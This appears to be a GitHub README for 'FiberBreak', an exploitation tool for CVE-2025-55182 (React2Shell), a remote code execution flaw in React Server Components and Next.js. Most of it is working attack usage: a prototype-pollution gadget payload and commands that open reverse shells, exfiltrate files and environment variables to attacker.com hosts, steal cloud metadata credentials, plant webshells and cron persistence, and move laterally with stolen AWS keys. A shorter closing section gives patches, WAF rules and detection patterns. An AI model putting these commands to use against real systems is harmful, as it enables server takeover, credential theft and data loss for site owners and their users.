# FiberBreak

Exploitation framework for CVE-2025-55182 (React2Shell) -
Critical RCE vulnerability in React Server Components.

## Overview

-   **CVE**: CVE-2025-55182
-   **CVSS**: 10.0 (CRITICAL)
-   **Type**: Remote Code Execution (RCE)
-   **Affected**: React 19.0.0-rc.0 to 19.0.0, Next.js 15.0.0 to 15.0.3
-   **Discovery**: Lachlan Miller (SonarSource)
-   **Public PoC**: maple3142

## Installation

``` bash
# Clone repository
git clone https://github.com/scumfrog/fiberbreak
cd fiberbreak

# Install dependencies
pip install -r requirements.txt

# Make executable
chmod +x fiberbreak.py
```

## Quick Start

``` bash
# Build vulnerable testing environment
docker-compose up -d

# Wait for startup
sleep 20

# Test detection
./fiberbreak.py -u http://localhost:3000 detect

# Execute RCE
./fiberbreak.py -u http://localhost:3000 exploit -c "whoami"

# Verify
docker exec react2shell-lab ls -la /tmp/
```

## Technical Details

### Vulnerability Overview

CVE-2025-55182 is a critical remote code execution vulnerability in React Server Components (RSC) that allows unauthenticated attackers to execute arbitrary code on the server.

**Root Cause**: The React Flight protocol deserializes untrusted client input without proper validation, allowing attackers to craft malicious payloads that abuse JavaScript's prototype chain and Function constructor.

**Attack Vector**: Attackers send a crafted multipart/form-data POST request with a `Next-Action` header to any RSC endpoint. The malicious payload leverages:
1. Prototype pollution via `__proto__` access
2. Function constructor exposure via `constructor:constructor`
3. Promise resolution to trigger code execution

### Exploitation Flow
```
1. Attacker sends crafted POST request
   └─ multipart/form-data with malicious JSON
   └─ Next-Action header (any value)

2. Server deserializes payload
   └─ React processes RSC chunk format
   └─ Resolves Promise-like object

3. Gadget chain triggers
   └─ __proto__ access bypasses hasOwnProperty checks
   └─ constructor:constructor exposes Function()
   └─ _prefix executes arbitrary code

4. RCE achieved
   └─ Server executes attacker's JavaScript
   └─ Full system compromise
```

### The Gadget
```javascript
{
  "then": "$1:__proto__:then",           // Prototype pollution
  "status": "resolved_model",            // Fake React internal state
  "reason": -1,                          // Trigger resolution
  "value": '{"then":"$B1337"}',         // Blob reference
  "_response": {
    "_prefix": "MALICIOUS_CODE_HERE;",   // Executed code
    "_formData": {
      "get": "$1:constructor:constructor" // Function() access
    }
  }
}
```

### Affected Code Path
```javascript
// react-server-dom-webpack/src/ReactFlightClient.js
function resolveModelChunk(chunk) {
  const value = JSON.parse(chunk.value);
  
  // Missing validation here allows malicious chunks
  if (value && typeof value.then === 'function') {
    // Attacker controls 'then' method
    value.then(/* ... */);
  }
}
```

## Usage

### Vulnerability Detection

``` bash
# Single target detection
./fiberbreak.py -u https://target.com detect

# Multiple targets from file
./fiberbreak.py -l targets.txt detect --threads 20

# Save results to JSON
./fiberbreak.py -l targets.txt detect -o results.json

# Disable SSL verification
./fiberbreak.py -u https://target.com detect --no-verify-ssl
```

### Basic Exploitation

``` bash
# Simple blind command execution
./fiberbreak.py -u https://target.com exploit -c "whoami"

# Write file to disk
./fiberbreak.py -u https://target.com exploit \
  -c "/tmp/pwned.txt:HACKED" -t write_file

# Read file contents
./fiberbreak.py -u https://target.com exploit \
  -c "/etc/passwd:https://attacker.com" -t file_read
```

### Advanced Exploitation

``` bash
# Reverse shell
./fiberbreak.py -u https://target.com exploit \
  -c "10.10.10.10:4444" -t reverse_shell

# DNS exfiltration (stealthy, no HTTP traffic)
./fiberbreak.py -u https://target.com exploit \
  -c "whoami:attacker.oastify.com" -t dns_exfil

# HTTP exfiltration with output
./fiberbreak.py -u https://target.com exploit \
  -c "id:https://attacker.com/exfil" -t http_exfil

# Environment variable dump
./fiberbreak.py -u https://target.com exploit \
  -c "https://attacker.com/env" -t env_dump

# System reconnaissance
./fiberbreak.py -u https://target.com exploit \
  -c "https://attacker.com/recon" -t recon

# Stealth DNS beacon (no command output)
./fiberbreak.py -u https://target.com exploit \
  -c "attacker.oastify.com" -t stealth_beacon
```

### Cloud Exploitation

``` bash
# Auto-detect cloud provider and extract credentials
# Supports: AWS, GCP, Azure, DigitalOcean, Oracle Cloud, Alibaba Cloud
./fiberbreak.py -u https://target.com exploit \
  -c "https://attacker.com/cloud" -t cloud_metadata
```

## Payload Types

| Type | Format | Description | Output |
|------|--------|-------------|--------|
| `simple` | `command` | Execute any shell command | Blind |
| `output` | `command` + `--callback` | Execute with HTTP callback | Yes |
| `reverse_shell` | `lhost:lport` | Bash reverse shell | Interactive |
| `dns_exfil` | `cmd:domain` or `domain` | DNS exfiltration | DNS logs |
| `http_exfil` | `cmd:callback_url` | HTTP exfiltration | HTTP POST |
| `file_read` | `filepath:callback` | Read and exfiltrate file | HTTP POST |
| `write_file` | `filepath:content` | Write file to disk | Blind |
| `env_dump` | `callback_url` | Dump environment variables | HTTP POST |
| `cloud_metadata` | `callback_url` | Extract cloud credentials | HTTP POST |
| `recon` | `callback_url` | System reconnaissance | HTTP POST |
| `stealth_beacon` | `domain` | DNS beacon | DNS logs |
| `webshell` | `filepath` | Deploy Node.js webshell | Port 8080 |
| `persist` | `callback_url` | Install cron persistence | Cron job |

## Real-World Scenarios

### Bug Bounty Hunting
```bash
# 1. Stealthy detection with DNS beacon
./fiberbreak.py -u https://target.com exploit \
  -c "recon.yourburp.oastify.com" -t stealth_beacon

# 2. If vulnerable, extract sensitive data
./fiberbreak.py -u https://target.com exploit \
  -c "https://yourserver.com/exfil" -t env_dump

# 3. Check for cloud environment
./fiberbreak.py -u https://target.com exploit \
  -c "https://yourserver.com/cloud" -t cloud_metadata

# 4. Document findings without causing damage
```

### Penetration Testing
```bash
# Phase 1: Detection
./fiberbreak.py -u https://target.com detect -o detection.json

# Phase 2: Verification
./fiberbreak.py -u https://target.com exploit \
  -c "/tmp/pentest_proof.txt:PENTEST_$(date +%s)" -t write_file

# Phase 3: Impact Assessment
./fiberbreak.py -u https://target.com exploit \
  -c "https://pentest-server.com/impact" -t recon

# Phase 4: Credential Extraction (if cloud)
./fiberbreak.py -u https://target.com exploit \
  -c "https://pentest-server.com/creds" -t cloud_metadata

# Phase 5: Interactive Access (if authorized)
# Terminal 1: Start listener
nc -lvnp 4444

# Terminal 2: Get shell
./fiberbreak.py -u https://target.com exploit \
  -c "YOUR_IP:4444" -t reverse_shell
```

### Mass Vulnerability Scanning
```bash
# Create target list
cat > targets.txt << EOF
https://app1.company.com
https://app2.company.com
https://app3.company.com
https://api.company.com
EOF

# Scan all targets in parallel
./fiberbreak.py -l targets.txt detect --threads 50 -o scan_results.json

# Filter vulnerable targets
cat scan_results.json | jq '.[] | select(.vulnerable==true) | .url'

# Generate report
cat scan_results.json | jq '{
  total: length,
  vulnerable: [.[] | select(.vulnerable==true)] | length,
  targets: [.[] | select(.vulnerable==true) | .url]
}'
```

### Cloud Infrastructure Assessment
```bash
# AWS EC2 Instance
./fiberbreak.py -u https://aws-app.com exploit \
  -c "https://attacker.com/aws" -t cloud_metadata

# Callback receives:
# - Instance ID, region, availability zone
# - IAM role name
# - Temporary AWS credentials (AccessKeyId, SecretAccessKey, Token)
# - User data
# - Network configuration

# GCP Compute Engine
./fiberbreak.py -u https://gcp-app.com exploit \
  -c "https://attacker.com/gcp" -t cloud_metadata

# Callback receives:
# - Project ID, instance name, zone
# - Service account email
# - OAuth2 access token
# - Available scopes

# Azure Virtual Machine
./fiberbreak.py -u https://azure-app.com exploit \
  -c "https://attacker.com/azure" -t cloud_metadata

# Callback receives:
# - Instance metadata
# - Managed identity OAuth2 token
# - Subscription information
```

## Exploitation Techniques

### Technique 1: Blind RCE Confirmation
```bash
# Create unique marker file
MARKER="pwned_$(date +%s)"
./fiberbreak.py -u https://target.com exploit \
  -c "/tmp/${MARKER}:proof" -t write_file

# Verify via timing attack or out-of-band
./fiberbreak.py -u https://target.com exploit \
  -c "curl https://attacker.com/${MARKER}" -t simple
```

### Technique 2: Data Exfiltration Pipeline
```bash
# Step 1: Enumerate files
./fiberbreak.py -u https://target.com exploit \
  -c "find /app -type f -name '*.env':https://attacker.com/files" -t http_exfil

# Step 2: Extract configuration
./fiberbreak.py -u https://target.com exploit \
  -c "/app/.env:https://attacker.com/config" -t file_read

# Step 3: Extract database credentials
./fiberbreak.py -u https://target.com exploit \
  -c "https://attacker.com/env" -t env_dump
```

### Technique 3: Lateral Movement
```bash
# Extract AWS credentials
./fiberbreak.py -u https://target.com exploit \
  -c "https://attacker.com/aws" -t cloud_metadata

# Use extracted credentials for lateral movement
export AWS_ACCESS_KEY_ID=""
export AWS_SECRET_ACCESS_KEY=""
export AWS_SESSION_TOKEN=""

# Enumerate resources
aws s3 ls
aws ec2 describe-instances
aws rds describe-db-instances
```

## Mitigation and Detection

### Immediate Patching
```bash
# Update React
npm install react@19.0.3 react-dom@19.0.3

# Update Next.js
npm install next@15.0.4  # or next@15.1.0+

# Verify versions
npm list react react-dom next
```

### WAF Rules

**nginx**
```nginx
# Block requests with Next-Action header
if ($http_next_action) {
    return 403;
}

# Rate limit RSC endpoints
limit_req_zone $binary_remote_addr zone=rsc:10m rate=10r/s;

location / {
    limit_req zone=rsc burst=20;
}
```

**Apache (ModSecurity)**
```apache
# Detect Next-Action header
SecRule REQUEST_HEADERS:Next-Action "@rx ." \
    "id:2025551820,\
     phase:2,\
     deny,\
     status:403,\
     log,\
     msg:'CVE-2025-55182 exploitation attempt detected'"

# Detect malicious RSC payloads
SecRule REQUEST_BODY "@rx (__proto__|constructor|prototype)" \
    "id:2025551821,\
     phase:2,\
     deny,\
     status:403,\
     log,\
     msg:'Malicious RSC payload detected'"
```

**Cloudflare WAF**
```javascript
// Custom rule
(http.request.headers["next-action"] ne "") or
(http.request.body.raw contains "__proto__") or
(http.request.body.raw contains "constructor:constructor")
```

### Network-Level Detection
```bash
# Snort/Suricata rule
alert tcp any any -> any any (
    msg:"CVE-2025-55182 React2Shell exploitation attempt";
    flow:to_server,established;
    content:"Next-Action"; http_header;
    content:"__proto__"; http_client_body;
    sid:2025551820;
    rev:1;
)
```

### Application-Level Protection
```javascript
// Next.js middleware
export function middleware(request) {
  // Block requests with Next-Action header from untrusted sources
  if (request.headers.get('next-action')) {
    // Validate origin
    const origin = request.headers.get('origin');
    const allowedOrigins = ['https://yourdomain.com'];
    
    if (!allowedOrigins.includes(origin)) {
      return new Response('Forbidden', { status: 403 });
    }
  }
  
  return NextResponse.next();
}

export const config = {
  matcher: '/:path*',
};
```

### Monitoring and Alerting
```bash
# Monitor for exploitation attempts in logs
grep -r "Next-Action" /var/log/nginx/access.log
grep -r "__proto__" /var/log/nginx/access.log

# Alert on suspicious patterns
tail -f /var/log/nginx/access.log | grep -E "(Next-Action|__proto__|constructor:constructor)" | \
while read line; do
    echo "[ALERT] Potential CVE-2025-55182 exploitation: $line"
    # Send to SIEM/alerting system
done
```

## References

### Official Resources
- [NVD CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [React Security Advisory](https://github.com/facebook/react/security/advisories)
- [Next.js Security Advisory](https://github.com/vercel/next.js/security/advisories)

### Research Papers
- [Wiz Security: React2Shell Deep Dive](https://www.wiz.io/blog/nextjs-cve-2025-55182-react2shell-deep-dive)
- [OffSec: CVE-2025-55182 Analysis](https://www.offsec.com/blog/cve-2025-55182/)
- [SonarSource: Original Discovery](https://www.sonarsource.com/blog/react-server-components-rce/)

### Community Resources
- [maple3142](https://github.com/maple3142/)
- [Public Exploits Collection](https://github.com/projectdiscovery/nuclei-templates)


## Legal Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY**

Unauthorized use is prohibited. See LICENSE for details.
